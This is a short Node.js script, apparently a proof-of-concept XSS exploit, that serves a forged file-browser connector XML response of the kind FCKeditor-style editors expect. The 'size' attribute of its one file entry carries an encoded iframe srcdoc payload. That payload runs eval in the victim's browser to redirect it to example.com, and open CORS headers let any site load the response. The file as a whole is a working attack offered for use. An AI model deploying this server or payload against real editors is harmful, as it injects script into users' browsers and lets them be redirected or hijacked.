const http = require('http');
const fs = require('fs');
const path = require('path');

const server = http.createServer((req, res) => {
    const xml = `<Connector command="GetFoldersAndFiles" resourceType="Document">
<CurrentFolder path="/1 - f/" url=""/>
<Folders/>
<Files>
<File desc="1" name="Loading..." size="&amp;lt;iframe srcdoc=&amp;quot;&amp;lt;script&amp;gt;eval(&amp;quot;window.location = &amp;apos;https://www.example.com&amp;apos;&amp;quot;);&#10;&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt;" url="1"/>
</Files>
</Connector>`;
    
    res.writeHead(200, { 
        'Content-Type': 'application/xml',
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
        'Access-Control-Allow-Headers': 'Content-Type'
    });
    res.end(xml);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
